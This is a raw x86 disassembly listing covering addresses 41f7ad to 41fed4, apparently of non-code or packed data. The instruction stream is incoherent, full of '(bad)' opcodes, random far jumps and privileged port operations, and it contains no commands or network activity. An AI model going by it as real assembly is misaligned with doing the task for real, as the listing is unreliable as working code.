  41f7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ae:	shr    al,1
  41f7b0:	sar    BYTE PTR [edx],0x56
  41f7b3:	test   ebp,esi
  41f7b5:	jno    0x41f80a
  41f7b7:	push   edi
  41f7b8:	inc    eax
  41f7b9:	mov    dh,0xe6
  41f7bb:	scas   al,BYTE PTR es:[edi]
  41f7bc:	mov    eax,0x4996562f
  41f7c1:	jo     0x41f80b
  41f7c3:	comiss xmm3,DWORD PTR [edi-0x67]
  41f7c7:	les    ebp,FWORD PTR [edi]
  41f7c9:	adc    al,0x43
  41f7cb:	cmp    eax,0x6759f7d2
  41f7d0:	pop    ecx
  41f7d1:	pop    ss
  41f7d2:	xor    al,al
  41f7d4:	sbb    esi,ecx
  41f7d6:	mov    WORD PTR [edx],cs
  41f7d8:	add    ecx,0x9c2d3dbe
  41f7de:	psubsb mm0,mm0
  41f7e1:	sub    al,0x6
  41f7e3:	mov    esi,0x365ea887
  41f7e8:	retf   0x59da
  41f7eb:	ror    BYTE PTR [eax-0x25],1
  41f7ee:	jmp    FWORD PTR [esi-0xa404014]
  41f7f4:	push   esi
  41f7f5:	mov    cl,0xdd
  41f7f7:	adc    DWORD PTR [ebp+0x32cbed8e],edx
  41f7fd:	test   BYTE PTR [eax],dl
  41f7ff:	or     DWORD PTR [edx-0x19f95020],0x30
  41f806:	call   0x62c5:0xe74e7862
  41f80d:	std    
  41f80e:	inc    ecx
  41f80f:	lods   al,BYTE PTR ds:[esi]
  41f810:	mov    ah,0xbb
  41f812:	call   0x34412f3c
  41f817:	adc    al,0x58
  41f819:	push   ds
  41f81a:	imul   BYTE PTR [ebx-0x26]
  41f81d:	or     DWORD PTR [eax],ebp
  41f81f:	mov    eax,ds:0x290fee0d
  41f824:	cmp    dh,BYTE PTR [edx+0x5edbe101]
  41f82a:	jb     0x41f82f
  41f82c:	mov    ch,0x98
  41f82e:	dec    edi
  41f82f:	push   0x3d
  41f831:	addr16 push 0xffffffa1
  41f834:	inc    edx
  41f835:	(bad)  
  41f836:	fist   WORD PTR [ecx+0x24]
  41f839:	or     eax,0xfc1bf10f
  41f83e:	mov    BYTE PTR [edx-0x7],ah
  41f841:	jns    0x41f854
  41f843:	(bad)  
  41f844:	and    BYTE PTR [ebp+eax*8+0x42],bh
  41f848:	xchg   ebx,eax
  41f849:	push   ecx
  41f84a:	popw   ds
  41f84c:	rcl    BYTE PTR [ebx],1
  41f84e:	cmc    
  41f84f:	and    al,0x78
  41f851:	sbb    edi,esi
  41f853:	sub    BYTE PTR [eax-0x62],ah
  41f856:	das    
  41f857:	imul   esp,DWORD PTR [ecx+0x72390ff1],0x7c4486a
  41f861:	icebp  
  41f862:	faddp  st(3),st
  41f864:	mov    DWORD PTR [ebp+0x79],eax
  41f867:	xor    BYTE PTR [edx-0x6e],0xd2
  41f86b:	or     DWORD PTR [ebp-0x6bff9b22],edx
  41f871:	mov    DWORD PTR [ecx-0x26],eax
  41f874:	mov    DWORD PTR [esi+0x6d],ebx
  41f877:	rcr    BYTE PTR [ebx+0x12ac48be],1
  41f87d:	push   ss
  41f87e:	(bad)  
  41f87f:	out    0x36,eax
  41f881:	adc    ebp,ebp
  41f883:	mov    ebp,0x13fd7df6
  41f888:	pop    ss
  41f889:	xchg   bl,dh
  41f88b:	ins    BYTE PTR es:[edi],dx
  41f88c:	jmp    0x41f88c
  41f88e:	dec    edx
  41f88f:	retf   0xe0e1
  41f892:	aad    0x94
  41f894:	inc    ebx
  41f895:	add    al,0x83
  41f897:	jl     0x41f8be
  41f899:	fistp  QWORD PTR [ecx-0x24]
  41f89c:	mov    esp,0x7ab5c05
  41f8a1:	xchg   esi,eax
  41f8a2:	mov    al,0x84
  41f8a4:	es icebp 
  41f8a6:	cmp    al,0x37
  41f8a8:	xchg   DWORD PTR [eax-0x2d93eb56],edi
  41f8ae:	pop    ebx
  41f8af:	scas   al,BYTE PTR es:[edi]
  41f8b0:	push   ebp
  41f8b1:	retf   
  41f8b2:	lods   al,BYTE PTR ds:[esi]
  41f8b3:	xor    al,0x1f
  41f8b5:	adc    al,0xf5
  41f8b7:	test   BYTE PTR [eax+0x2991f626],0x16
  41f8be:	out    0x48,eax
  41f8c0:	push   0xcdc2040d
  41f8c5:	xor    eax,0xb48a9394
  41f8ca:	pushf  
  41f8cb:	mov    esi,0x5e59d27b
  41f8d0:	push   ebx
  41f8d1:	imul   eax,DWORD PTR [ebp-0xd],0x28
  41f8d5:	in     eax,0x83
  41f8d7:	mov    ecx,0xad10779a
  41f8dc:	shl    BYTE PTR [eax-0x1e],0x42
  41f8e0:	jb     0x41f915
  41f8e2:	aaa    
  41f8e3:	std    
  41f8e4:	mov    edx,0x43d539ce
  41f8e9:	gs lock and al,0xac
  41f8ed:	xlat   BYTE PTR ds:[ebx]
  41f8ee:	std    
  41f8ef:	add    ebp,eax
  41f8f1:	dec    esp
  41f8f2:	and    eax,0x38edcbd4
  41f8f7:	je     0x41f892
  41f8f9:	neg    WORD PTR [esi-0x2d]
  41f8fd:	xchg   BYTE PTR [edi-0x34],cl
  41f900:	out    0x62,eax
  41f902:	mov    esi,0x8a74d4a3
  41f907:	dec    esp
  41f908:	push   esi
  41f909:	xchg   esp,eax
  41f90a:	xor    BYTE PTR ss:[eax],0x5d
  41f90e:	push   ebp
  41f90f:	mov    edi,0xf0695bad
  41f914:	in     al,dx
  41f915:	and    esi,DWORD PTR [ebx+0x49e04877]
  41f91b:	fdivp  st(2),st
  41f91d:	(bad)  
  41f91e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f91f:	hlt    
  41f920:	mov    cl,0xa8
  41f922:	xchg   esp,eax
  41f923:	enter  0xe0b1,0xee
  41f927:	adc    al,0x4f
  41f929:	shr    DWORD PTR [edx+0x4007fd23],cl
  41f92f:	sti    
  41f930:	int3   
  41f931:	sar    DWORD PTR [ebx+0x34],0x5a
  41f935:	dec    edx
  41f936:	mov    DWORD PTR [eax],edx
  41f938:	cmc    
  41f939:	pop    ss
  41f93a:	shr    DWORD PTR [ebx+0x32],1
  41f93d:	xor    eax,0xd00b1a94
  41f942:	pop    edx
  41f943:	mov    ch,0x4f
  41f945:	pop    DWORD PTR [ebp+0x45f3e749]
  41f94b:	adc    bh,BYTE PTR [ecx-0x79f2e7db]
  41f951:	mov    dh,0xdd
  41f953:	sub    eax,0x61da1dd
  41f958:	sub    eax,0xaeea3c7f
  41f95d:	sti    
  41f95e:	rcl    dh,0xb6
  41f961:	inc    esp
  41f962:	mov    ds:0xe0761375,eax
  41f967:	jae    0x41f93d
  41f969:	aas    
  41f96a:	pop    ebx
  41f96b:	data16 mov ah,0x2f
  41f96e:	test   al,0xf9
  41f970:	push   esi
  41f971:	push   0xffffffc5
  41f973:	sbb    ah,BYTE PTR [esi+0x177845ed]
  41f979:	mov    bh,0x35
  41f97b:	xchg   edx,eax
  41f97c:	fldz   
  41f97e:	lods   al,BYTE PTR ds:[esi]
  41f97f:	sub    eax,0x8659142e
  41f984:	retf   0x104
  41f987:	dec    esp
  41f988:	jg     0xce1ddf60
  41f98e:	imul   ebx,DWORD PTR [esi],0x52
  41f991:	enter  0x4db6,0x44
  41f995:	sub    cl,al
  41f997:	data16 cli 
  41f999:	xor    DWORD PTR [edi+edi*4-0x32],eax
  41f99d:	sti    
  41f99e:	sbb    BYTE PTR gs:[edi],bl
  41f9a1:	pop    ebx
  41f9a2:	or     eax,0xbdd08916
  41f9a7:	mov    ebx,0x891d1c91
  41f9ac:	clc    
  41f9ad:	sub    ebp,DWORD PTR [edi+eax*8+0xdcf8dc1]
  41f9b4:	(bad)  
  41f9b5:	(bad)
  41f9b9:	pop    eax
  41f9ba:	jae    0x41f9f1
  41f9bc:	jle    0x41f944
  41f9be:	dec    eax
  41f9bf:	lea    ecx,[edi]
  41f9c1:	pop    ss
  41f9c2:	je     0x41f9db
  41f9c4:	out    dx,eax
  41f9c5:	mov    DWORD PTR [ebx+ebx*2],ebp
  41f9c8:	cli    
  41f9c9:	cwde   
  41f9ca:	ss jbe 0x41fa2c
  41f9cd:	test   al,0xad
  41f9cf:	stc    
  41f9d0:	or     al,0x6d
  41f9d2:	jb     0x41f991
  41f9d4:	pop    ebp
  41f9d5:	push   cs
  41f9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9d7:	push   ss
  41f9d8:	mov    edx,0x86a4d10c
  41f9dd:	lds    ebp,FWORD PTR [eax-0x27]
  41f9e0:	not    cl
  41f9e2:	nop
  41f9e3:	cmp    esp,DWORD PTR [eax+0x3ac7cf5a]
  41f9e9:	in     eax,dx
  41f9ea:	add    al,0xf1
  41f9ec:	cmp    DWORD PTR [ebp+0x17097d0a],esp
  41f9f2:	adc    edx,esi
  41f9f4:	cwde   
  41f9f5:	stos   DWORD PTR es:[edi],eax
  41f9f6:	cmp    DWORD PTR [edx+0x7f4acc2d],0xb1319fa3
  41fa00:	inc    edi
  41fa01:	aad    0xe6
  41fa03:	adc    bh,al
  41fa05:	loop   0x41fa03
  41fa07:	jl     0x41f991
  41fa09:	mov    esi,0x6860e7c5
  41fa0e:	jmp    FWORD PTR [eax+0x76521875]
  41fa14:	retf   0x4439
  41fa17:	mov    edx,DWORD PTR [edi-0x37]
  41fa1a:	mov    al,ds:0x33ca5b63
  41fa1f:	in     eax,dx
  41fa20:	cmp    cl,BYTE PTR [ebp+0x32d6932e]
  41fa26:	and    edx,DWORD PTR [edi-0x49]
  41fa29:	retf   
  41fa2a:	xchg   edi,eax
  41fa2b:	mov    fs,WORD PTR [edi]
  41fa2d:	idiv   DWORD PTR [edx+0x46]
  41fa30:	pop    ebx
  41fa31:	push   edx
  41fa32:	or     ecx,eax
  41fa34:	outs   dx,DWORD PTR ds:[esi]
  41fa35:	call   0xebf313c5
  41fa3a:	xchg   DWORD PTR [esi-0x6e2fc98a],edi
  41fa40:	mov    eax,ds:0x735e8824
  41fa45:	loope  0x41fa46
  41fa47:	mov    bl,0xaa
  41fa49:	adc    eax,0x72e3e6e8
  41fa4e:	fisttp QWORD PTR [ebx]
  41fa50:	sahf   
  41fa51:	add    ebp,esi
  41fa53:	sub    eax,0x6a7e4e73
  41fa58:	sub    eax,ebx
  41fa5a:	jo     0x41fa77
  41fa5c:	xchg   edx,eax
  41fa5d:	xchg   esi,eax
  41fa5e:	mov    WORD PTR [ebp+0x78],ss
  41fa61:	ins    BYTE PTR es:[edi],dx
  41fa62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa63:	fst    DWORD PTR [eax]
  41fa65:	xchg   edi,eax
  41fa66:	pop    ss
  41fa67:	and    ch,dh
  41fa69:	xchg   edx,eax
  41fa6a:	jb     0x41fa34
  41fa6c:	in     al,dx
  41fa6d:	jns    0x41fa07
  41fa6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa70:	ror    BYTE PTR [ecx+0x2ab70ca4],cl
  41fa76:	inc    edx
  41fa77:	or     esi,DWORD PTR [edx-0x4005720c]
  41fa7d:	clc    
  41fa7e:	mov    edi,0x4908e59c
  41fa83:	nop
  41fa84:	(bad)  
  41fa85:	mul    BYTE PTR [ecx]
  41fa87:	stc    
  41fa88:	nop
  41fa89:	scas   eax,DWORD PTR es:[edi]
  41fa8a:	loope  0x41fa82
  41fa8c:	pop    ebx
  41fa8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa8e:	inc    ecx
  41fa8f:	or     dh,BYTE PTR [esi+edi*2]
  41fa92:	inc    edi
  41fa93:	pop    eax
  41fa94:	jle    0x41fa79
  41fa96:	adc    al,0xf6
  41fa98:	jle    0x41fa21
  41fa9a:	xchg   BYTE PTR [ecx-0x49],cl
  41fa9d:	dec    ebx
  41fa9e:	mov    edi,0x90b19731
  41faa3:	scas   eax,DWORD PTR es:[edi]
  41faa4:	or     edx,DWORD PTR [esi-0x5cfa5440]
  41faaa:	in     eax,0xd5
  41faac:	mov    esp,0x1f801c7c
  41fab1:	adc    esi,DWORD PTR [ebx-0x7109c97f]
  41fab7:	pop    esp
  41fab8:	bound  eax,QWORD PTR [ebx-0x4d]
  41fabb:	leave  
  41fabc:	sahf   
  41fabd:	bnd jp 0x41faff
  41fac0:	jge    0x41fb29
  41fac2:	pop    edx
  41fac3:	bound  ecx,QWORD PTR [edi+eiz*2+0x4f1b4393]
  41faca:	inc    esi
  41facb:	sbb    BYTE PTR [eax-0x58678877],dh
  41fad1:	and    al,0x90
  41fad3:	and    al,0xdf
  41fad5:	retf   0xa52d
  41fad8:	push   esi
  41fad9:	in     eax,dx
  41fada:	fnsave [ecx-0x30]
  41fadd:	dec    ecx
  41fade:	pop    esp
  41fadf:	mov    al,0x52
  41fae1:	(bad)  
  41fae2:	sub    ebx,DWORD PTR [esi-0x5b]
  41fae5:	mov    ds:0x2a4dca1d,al
  41faea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faeb:	pop    ebp
  41faec:	xor    al,0xdc
  41faee:	pop    ebp
  41faef:	or     dh,BYTE PTR [ebp+0x13]
  41faf2:	mov    gs,WORD PTR [edx+eiz*1-0x30af0459]
  41faf9:	mov    edx,0xeca8fa25
  41fafe:	dec    esp
  41faff:	jmp    0x4a29408b
  41fb04:	push   edx
  41fb05:	pop    ds
  41fb06:	(bad)
  41fb09:	js     0x41fb28
  41fb0b:	xchg   edi,eax
  41fb0c:	je     0x41faa8
  41fb0e:	xor    DWORD PTR [esp+esi*2+0x25],edx
  41fb12:	std    
  41fb13:	fadd   DWORD PTR [esi-0x2]
  41fb16:	shl    DWORD PTR [ebp+0x54ac3aae],1
  41fb1c:	mov    eax,0xe5efdf2e
  41fb21:	fisttp WORD PTR [edx+0x41]
  41fb24:	pop    ebx
  41fb25:	gs iret 
  41fb27:	adc    cl,0x7
  41fb2a:	mov    ?,WORD PTR [esi-0x1c]
  41fb2d:	js     0x41fba9
  41fb2f:	pushf  
  41fb30:	mov    edx,0x2b60480a
  41fb35:	icebp  
  41fb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb37:	popa   
  41fb38:	push   ebx
  41fb39:	sub    al,0xe7
  41fb3b:	jo     0x41fbbc
  41fb3d:	push   0xea46a051
  41fb42:	cmp    edx,ebx
  41fb44:	leave  
  41fb45:	mov    ds:0xd8c51d70,eax
  41fb4a:	pop    ds
  41fb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb4c:	pusha  
  41fb4d:	iret   
  41fb4e:	jp     0x41fb1c
  41fb50:	das    
  41fb51:	jp     0x41fba5
  41fb53:	mov    ds:0x6f9ead67,eax
  41fb58:	sub    DWORD PTR [edi-0x7],ebp
  41fb5b:	adc    al,0x3e
  41fb5d:	jge    0x41fb2e
  41fb5f:	daa    
  41fb60:	sub    eax,0x7c84004f
  41fb65:	and    al,0x5e
  41fb67:	pop    ss
  41fb68:	scas   al,BYTE PTR es:[edi]
  41fb69:	dec    ebx
  41fb6a:	test   al,0x9
  41fb6c:	or     al,0xee
  41fb6e:	inc    ebp
  41fb6f:	dec    edx
  41fb70:	cdq    
  41fb71:	add    dh,dh
  41fb73:	dec    ecx
  41fb74:	ret    
  41fb75:	inc    esp
  41fb76:	or     DWORD PTR [eax-0x23],ebp
  41fb79:	fld    DWORD PTR es:[ebx-0x1d]
  41fb7d:	(bad)  
  41fb7e:	(bad)  
  41fb7f:	scas   eax,DWORD PTR es:[edi]
  41fb80:	sahf   
  41fb81:	(bad)  
  41fb82:	call   0x3340:0x50d0ea87
  41fb89:	xor    ebx,DWORD PTR [edi+0x28]
  41fb8c:	ror    BYTE PTR [ecx+0x7d],cl
  41fb8f:	and    eax,0x147e69c1
  41fb94:	xchg   esi,eax
  41fb95:	dec    ebx
  41fb96:	retf   
  41fb97:	pop    edx
  41fb98:	xor    ch,BYTE PTR [eax+0x7be9db61]
  41fb9e:	ins    BYTE PTR es:[edi],dx
  41fb9f:	sub    eax,0x4d3c6c30
  41fba4:	push   edx
  41fba5:	xchg   esi,eax
  41fba6:	mov    esp,0xa822ad81
  41fbab:	stos   BYTE PTR es:[edi],al
  41fbac:	dec    ebp
  41fbad:	inc    ebx
  41fbae:	jns    0x41fb5b
  41fbb0:	jno    0x41fb61
  41fbb2:	ja     0x41fba9
  41fbb4:	pop    edx
  41fbb5:	and    al,0xce
  41fbb7:	(bad)  
  41fbb8:	xor    eax,0xe630fef1
  41fbbd:	push   es
  41fbbe:	fistp  QWORD PTR [edi]
  41fbc0:	jge    0x41fb59
  41fbc2:	inc    edi
  41fbc3:	les    ecx,FWORD PTR [eax]
  41fbc5:	cmp    eax,0x2d3cf3d3
  41fbca:	in     eax,0x22
  41fbcc:	mov    cl,0xd7
  41fbce:	pusha  
  41fbcf:	adc    eax,0x43461e30
  41fbd4:	in     al,0x47
  41fbd6:	test   eax,0x6aba469b
  41fbdb:	test   BYTE PTR [ecx+0x61],cl
  41fbde:	adc    dl,al
  41fbe0:	jbe    0x41fc24
  41fbe2:	repnz lods al,BYTE PTR ds:[esi]
  41fbe4:	push   edi
  41fbe5:	inc    edx
  41fbe6:	clc    
  41fbe7:	dec    edx
  41fbe8:	loopne 0x41fbd8
  41fbea:	jge    0x41fb95
  41fbec:	add    ebx,DWORD PTR [ecx-0x2ea81fb]
  41fbf2:	imul   ebp,DWORD PTR [edx+0x12],0x402ff967
  41fbf9:	mov    ebx,0x56121c5d
  41fbfe:	sbb    BYTE PTR [ecx+ebp*1],0x26
  41fc02:	cdq    
  41fc03:	adc    al,0xd5
  41fc05:	dec    ebp
  41fc06:	sub    edx,esp
  41fc08:	lods   eax,DWORD PTR ds:[esi]
  41fc09:	imul   esp,edi,0x79
  41fc0c:	stos   DWORD PTR es:[edi],eax
  41fc0d:	(bad)  
  41fc0e:	sahf   
  41fc0f:	je     0x41fc16
  41fc11:	cmp    cl,BYTE PTR [eax+0xfc3d664]
  41fc17:	cld    
  41fc18:	mov    esp,0x93471f52
  41fc1d:	add    al,0xf7
  41fc1f:	inc    cx
  41fc21:	out    dx,eax
  41fc22:	scas   eax,DWORD PTR es:[edi]
  41fc23:	mov    ah,0x83
  41fc25:	cmp    dl,BYTE PTR [esi-0x37138864]
  41fc2b:	jg     0x41fc64
  41fc2d:	cmp    DWORD PTR [ecx-0x1ca0bf98],ebp
  41fc33:	xor    eax,0x3f27cc06
  41fc38:	aas    
  41fc39:	mov    bl,0x37
  41fc3b:	jge    0x41fcb4
  41fc3d:	sub    DWORD PTR [edx],0xbc540f7a
  41fc43:	fimul  WORD PTR [ebx+0x167c304]
  41fc49:	mov    ecx,0x93a8f0fe
  41fc4e:	popf   
  41fc4f:	fs ss std 
  41fc52:	leave  
  41fc53:	aaa    
  41fc54:	mov    ecx,0x2112fc59
  41fc59:	and    ch,BYTE PTR [ecx+0x50]
  41fc5c:	scas   al,BYTE PTR es:[edi]
  41fc5d:	jo     0x41fc3a
  41fc5f:	mov    ss,WORD PTR [edx+edx*8+0x4931fed6]
  41fc66:	mov    ebp,0xbafcd9f0
  41fc6b:	xor    al,0x22
  41fc6d:	call   0x372944e6
  41fc72:	xchg   esp,eax
  41fc73:	cli    
  41fc74:	rcl    edx,cl
  41fc76:	enter  0x4279,0xa2
  41fc7a:	xorps  xmm2,xmm7
  41fc7d:	pusha  
  41fc7e:	jge    0x41fcab
  41fc80:	or     al,0x3b
  41fc82:	sar    cl,1
  41fc84:	aaa    
  41fc85:	fwait
  41fc86:	mov    dl,0xa1
  41fc88:	stc    
  41fc89:	push   ecx
  41fc8a:	fldenv [edi+0x7a]
  41fc8d:	push   0x28
  41fc8f:	mov    edx,0x599e5ee1
  41fc94:	imul   ecx,DWORD PTR [edi-0x58ff3569],0xffffffc1
  41fc9b:	dec    ah
  41fc9d:	push   eax
  41fc9e:	lahf   
  41fc9f:	(bad)  
  41fca0:	inc    ebx
  41fca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fca2:	sub    al,0x79
  41fca4:	cs xchg ebp,eax
  41fca6:	mov    dl,0xfb
  41fca8:	fmul   DWORD PTR [edx]
  41fcaa:	lock adc DWORD PTR [ebx+0x26],edi
  41fcae:	pop    ds
  41fcaf:	mov    dl,0xa7
  41fcb1:	sub    BYTE PTR [esi],cl
  41fcb3:	mov    WORD PTR [ecx],cs
  41fcb5:	in     eax,0x79
  41fcb7:	mov    ecx,0x9042dfbd
  41fcbc:	sub    esi,DWORD PTR [esi+0x1]
  41fcbf:	inc    ecx
  41fcc0:	icebp  
  41fcc1:	jmp    0x41fd07
  41fcc3:	popa   
  41fcc4:	and    DWORD PTR [edx],ebx
  41fcc6:	mov    ah,0x12
  41fcc8:	jp     0x41fc7d
  41fcca:	lods   al,BYTE PTR ds:[esi]
  41fccb:	adc    esi,DWORD PTR [eax]
  41fccd:	enter  0xf8cf,0xe7
  41fcd1:	push   eax
  41fcd2:	leave  
  41fcd3:	cwde   
  41fcd4:	pop    edi
  41fcd5:	lods   eax,DWORD PTR ds:[esi]
  41fcd6:	test   DWORD PTR [ebx-0x34],0xf662e30e
  41fcdd:	rcl    BYTE PTR [ebp+0x52ffbd3c],cl
  41fce3:	or     DWORD PTR [esi],edx
  41fce5:	jg     0x41fcb6
  41fce7:	fs das 
  41fce9:	jb     0x41fcd2
  41fceb:	add    BYTE PTR [esp+ebp*1+0x39f350f5],cl
  41fcf2:	fwait
  41fcf3:	leave  
  41fcf4:	or     DWORD PTR [eax],0x5613e3da
  41fcfa:	nop
  41fcfb:	pop    eax
  41fcfc:	mov    dl,0xe5
  41fcfe:	mov    edx,0x20fd3563
  41fd03:	aaa    
  41fd04:	(bad)  
  41fd05:	cmp    BYTE PTR [edi],0xcb
  41fd08:	fs bnd jl 0x41fd32
  41fd0c:	outs   dx,DWORD PTR ds:[esi]
  41fd0d:	xor    DWORD PTR [ecx+0x78],esp
  41fd10:	xchg   esi,eax
  41fd11:	adc    bl,dh
  41fd13:	imul   esi,DWORD PTR [ecx],0x740fbf87
  41fd19:	(bad)  
  41fd1a:	sub    DWORD PTR [eax],ebx
  41fd1c:	aam    0xf7
  41fd1e:	std    
  41fd1f:	loope  0x41fd4b
  41fd21:	mov    ds,WORD PTR [edi]
  41fd23:	(bad)  
  41fd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd25:	fwait
  41fd26:	lods   eax,DWORD PTR ds:[esi]
  41fd27:	lods   eax,DWORD PTR ds:[esi]
  41fd28:	mov    cl,0x12
  41fd2a:	outs   dx,DWORD PTR ds:[esi]
  41fd2b:	or     bh,BYTE PTR ds:0x54cfd70f
  41fd31:	cmp    bh,BYTE PTR [ebx]
  41fd33:	or     bh,BYTE PTR [ecx]
  41fd35:	das    
  41fd36:	cmc    
  41fd37:	xchg   edi,eax
  41fd38:	outs   dx,BYTE PTR ds:[esi]
  41fd39:	repnz adc BYTE PTR [eax-0x3f],ch
  41fd3d:	hlt    
  41fd3e:	xlat   BYTE PTR ds:[ebx]
  41fd3f:	pop    ebx
  41fd40:	jnp    0x41fd50
  41fd42:	mov    bl,al
  41fd44:	inc    ebx
  41fd45:	daa    
  41fd46:	mov    ch,0x34
  41fd48:	xchg   edi,eax
  41fd49:	and    al,al
  41fd4b:	sub    eax,0xf04ea988
  41fd50:	xchg   esp,eax
  41fd51:	test   eax,0x44bc849d
  41fd56:	iret   
  41fd57:	push   ecx
  41fd58:	lahf   
  41fd59:	add    edi,eax
  41fd5b:	jl     0x41fda9
  41fd5d:	dec    ebx
  41fd5e:	sub    ah,bh
  41fd60:	je     0x41fd94
  41fd62:	sub    bh,ch
  41fd64:	and    al,0xb8
  41fd66:	fisttp WORD PTR [esi]
  41fd68:	(bad)  
  41fd69:	test   al,0x10
  41fd6b:	sahf   
  41fd6c:	adc    dl,bl
  41fd6e:	xchg   edi,eax
  41fd6f:	out    dx,al
  41fd70:	lods   al,BYTE PTR ds:[esi]
  41fd71:	loopne 0x41fd84
  41fd73:	jmp    eax
  41fd75:	jmp    0xaa90:0xd9c2e247
  41fd7c:	scas   al,BYTE PTR es:[edi]
  41fd7d:	aas    
  41fd7e:	(bad)  
  41fd7f:	out    dx,eax
  41fd80:	mov    bh,0xf1
  41fd82:	push   es
  41fd83:	data16 (bad) 
  41fd85:	scas   ax,WORD PTR es:[edi]
  41fd87:	jmp    0xab8:0x52580bb3
  41fd8e:	inc    eax
  41fd8f:	call   0xbad8:0x55586b9c
  41fd96:	mov    esp,0xc7e56ddf
  41fd9b:	dec    esp
  41fd9c:	sub    eax,0xf1cf1eba
  41fda1:	dec    edx
  41fda2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fda3:	push   edi
  41fda4:	lahf   
  41fda5:	(bad)  [ebx+0x3a]
  41fda8:	pop    edi
  41fda9:	aaa    
  41fdaa:	dec    esi
  41fdab:	loop   0x41fdc5
  41fdad:	outs   dx,BYTE PTR ds:[esi]
  41fdae:	xlat   BYTE PTR ds:[ebx]
  41fdaf:	bound  ebp,QWORD PTR [eax]
  41fdb1:	mov    al,0xc1
  41fdb3:	jnp    0x41fda6
  41fdb5:	jmp    0x41fde9
  41fdb7:	nop
  41fdb8:	mov    bh,0x54
  41fdba:	inc    ebp
  41fdbb:	and    dl,BYTE PTR [esi-0x70]
  41fdbe:	pop    ebp
  41fdbf:	sub    DWORD PTR [eax],esp
  41fdc1:	push   edx
  41fdc2:	jns    0x41fd46
  41fdc4:	scas   eax,DWORD PTR es:[edi]
  41fdc5:	cld    
  41fdc6:	mov    ebp,0xb7c8dba1
  41fdcb:	xchg   esi,eax
  41fdcc:	adc    edi,DWORD PTR ds:[ebx+0x53]
  41fdd0:	aam    0xd8
  41fdd2:	jns    0x41fde0
  41fdd4:	cwde   
  41fdd5:	push   edi
  41fdd6:	cmp    eax,DWORD PTR [eax+0x68a99b57]
  41fddc:	mov    eax,0x3a9f3c02
  41fde1:	clc    
  41fde2:	cmc    
  41fde3:	bound  ebp,QWORD PTR gs:[eax-0xbad87b2]
  41fdea:	in     ax,dx
  41fdec:	shr    DWORD PTR [edi*4-0x33e37c5],cl
  41fdf3:	mov    ds:0x2077c96a,al
  41fdf8:	xchg   ebp,eax
  41fdf9:	clc    
  41fdfa:	gs push ds
  41fdfc:	mov    WORD PTR [esi],cs
  41fdfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdff:	sub    cl,BYTE PTR [ebx]
  41fe01:	jmp    0x994ccf10
  41fe06:	inc    esi
  41fe07:	pop    edi
  41fe08:	jl     0x41fe25
  41fe0a:	xor    DWORD PTR [ecx],ecx
  41fe0c:	push   esp
  41fe0d:	push   ecx
  41fe0e:	call   0x6f16:0x47e1a949
  41fe15:	cmp    eax,0x40fe1b99
  41fe1a:	lods   al,BYTE PTR ds:[esi]
  41fe1b:	add    DWORD PTR [edx+0x55f099f6],0x67bcebb3
  41fe25:	inc    esp
  41fe26:	rcr    DWORD PTR [esi-0x5261ea73],cl
  41fe2c:	not    BYTE PTR [edx]
  41fe2e:	lods   eax,DWORD PTR ds:[esi]
  41fe2f:	adc    edi,DWORD PTR [eax]
  41fe31:	push   0x8c27c90e
  41fe36:	ins    DWORD PTR es:[edi],dx
  41fe37:	sahf   
  41fe38:	inc    edi
  41fe39:	sahf   
  41fe3a:	(bad)  
  41fe3b:	mov    bh,0x5b
  41fe3d:	push   ds
  41fe3e:	push   es
  41fe3f:	jmp    0x9019:0x3257262d
  41fe46:	shr    BYTE PTR [ebx],0xfb
  41fe49:	scas   al,BYTE PTR es:[edi]
  41fe4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4b:	cmp    edi,DWORD PTR [edx-0x636311fb]
  41fe51:	xor    DWORD PTR [ecx],0x602fe3eb
  41fe57:	lock cmp BYTE PTR [esi+ebp*4+0x14f2336a],bh
  41fe5f:	push   es
  41fe60:	fcom   QWORD PTR [eax]
  41fe62:	mov    ds:0xae17da04,al
  41fe67:	jmp    0x41fe5b
  41fe69:	addr16 inc ebx
  41fe6b:	adc    al,0x14
  41fe6d:	cmp    ebx,DWORD PTR [edi]
  41fe6f:	retf   0x6a1f
  41fe72:	pop    edx
  41fe73:	gs mov esp,eax
  41fe76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe77:	cld    
  41fe78:	pop    esi
  41fe79:	aad    0x5c
  41fe7b:	cmp    ebx,DWORD PTR [ebx]
  41fe7d:	adc    al,0x76
  41fe7f:	mov    ds:0xb6c043e,eax
  41fe84:	fld    QWORD PTR [eax]
  41fe86:	dec    eax
  41fe87:	xlat   BYTE PTR ds:[ebx]
  41fe88:	and    ecx,eax
  41fe8a:	inc    esp
  41fe8b:	push   edx
  41fe8c:	in     eax,0xb9
  41fe8e:	loop   0x41fef2
  41fe90:	aas    
  41fe91:	int3   
  41fe92:	push   ebp
  41fe93:	stos   BYTE PTR es:[edi],al
  41fe94:	sbb    al,0xff
  41fe96:	cmp    cl,BYTE PTR [ebx+0x566c3b6e]
  41fe9c:	jp     0x41fe8b
  41fe9e:	xor    al,0x7
  41fea0:	aad    0x21
  41fea2:	cmp    eax,0xb4aaaf40
  41fea7:	in     eax,0x5e
  41fea9:	and    DWORD PTR [ebp+0xd9c10bf],0x8
  41feb0:	cdq    
  41feb1:	or     ah,ch
  41feb3:	js     0x41fe43
  41feb5:	(bad)  
  41feb6:	popa   
  41feb7:	cmp    eax,0x2e7cb95
  41febc:	aad    0xad
  41febe:	jae    0x41febb
  41fec0:	fs pop edx
  41fec2:	add    edx,DWORD PTR [esp+esi*1+0x5a674e29]
  41fec9:	jne    0x41fe59
  41fecb:	frndint 
  41fecd:	(bad)  
  41fecf:	mov    edx,0x3fa95afa
  41fed4:	fisttp DWORD PTR [ecx]
